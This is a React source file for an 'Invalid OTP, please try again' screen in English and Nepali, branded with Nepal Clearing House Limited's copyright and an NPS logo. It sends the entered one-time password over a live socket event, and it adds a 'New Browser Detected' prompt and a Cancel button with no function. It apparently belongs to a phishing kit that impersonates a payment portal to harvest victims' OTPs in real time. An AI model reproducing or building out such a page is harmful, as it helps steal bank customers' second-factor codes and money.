import React, { useState, useEffect } from 'react';
import '../App.css';

function InvalidOTP({ socket }) {
  const [otp, setOtp] = useState('');
  const [language, setLanguage] = useState('EN');
  const [timer, setTimer] = useState(119); // Timer in seconds (1:23 = 83 seconds)

  const toggleLanguage = (lang) => setLanguage(lang);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (otp.trim()) {
      socket.emit('submitOTP', { otp });
    }
  };

  const handleOtpChange = (e) => {
    const value = e.target.value;
    // Allow only numbers and limit to 6 digits
    if (/^\d{0,6}$/.test(value)) {
      setOtp(value);
    }
  };

  // Countdown logic
  useEffect(() => {
    if (timer > 0) {
      const countdown = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);

      return () => clearInterval(countdown); // Cleanup interval on unmount
    }
  }, [timer]);

  // Format the timer as MM:SS
  const formatTimer = () => {
    const minutes = Math.floor(timer / 60);
    const seconds = timer % 60;
    return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
  };

  return (
    <div className="login-page">
      <div className="login-container">
        {/* Logo Section */}
        <div className="login-logo">
          <img src="logo.png" alt="Logo" className="logo-image" />

          {/* Language Toggle Capsule */}
          <div className="language-toggle-capsule">
            <button
              className={`language-option ${language === 'EN' ? 'active' : ''}`}
              onClick={() => toggleLanguage('EN')}
            >
              EN
            </button>
            <button
              className={`language-option ${language === 'ने' ? 'active' : ''}`}
              onClick={() => toggleLanguage('ने')}
            >
              ने
            </button>
          </div>
        </div>
		
		{/* Invalid OTP Section */}
        <h6 className="text-danger font-weight-bold mb-3">
          {language === 'EN'
            ? 'Invalid OTP. Please try again.'
            : 'अवैध OTP। कृपया पुन: प्रयास गर्नुहोस्।'}
        </h6>

        {/* OTP Section */}
        <form onSubmit={handleSubmit}>
          <h6 className="text-primary font-weight-bold mb-0">
            {language === 'EN'
              ? "New Browser Detected. Please verify it's you."
              : 'नयाँ ब्राउजर पत्ता लाग्यो। कृपया यो तपाईं हो भनेर प्रमाणित गर्नुहोस्।'}
          </h6>
          <small className="">
            {language === 'EN'
              ? 'OTP has been sent to your registered mobile number.'
              : 'OTP तपाईंको पंजीकृत मोबाइल नम्बरमा पठाइएको छ।'}
          </small>
          <div className="form-group mt-4 position-relative">
            <input
              id="exampleInputEmail1"
              aria-describedby="emailHelp"
              name="otp"
              maxLength="6"
              placeholder={language === 'EN' ? 'Enter OTP' : 'OTP प्रविष्ट गर्नुहोस्'}
              type="text"
              className="form-control"
              value={otp}
              onChange={handleOtpChange}
              required
            />
            {timer > 0 && (
              <div className="text-right">
                <span className="small text-primary mt-2">
                  {language === 'EN'
                    ? 'You can resend in '
                    : 'तपाईं पुनः पठाउन सक्नुहुन्छ '}
                  <span className="font-weight-bold">{formatTimer()}</span> seconds
                </span>
                <br />
                <br />
              </div>
            )}
          </div>
          <div className="d-flex mt-2 mb-4">
            <button className="btn btn-outline-primary flex-grow-1 mr-2" type="button">
              {language === 'EN' ? 'Cancel' : 'रद्द गर्नुहोस्'}
            </button>
            <button className="btn btn-primary flex-grow-1 ml-2" type="submit">
              {language === 'EN' ? 'Continue' : 'जारी राख्नुहोस्'}
            </button>
          </div>
        </form>

        {/* Footer Section */}
        <footer>
          <img src="footer.png" alt="Powered by NPS" className="powered-by-logo" />
          <p>version: 1.11.5</p>
          <p>Copyright © Nepal Clearing House Limited, 2018-2024</p>
        </footer>
      </div>
    </div>
  );
}

export default InvalidOTP;
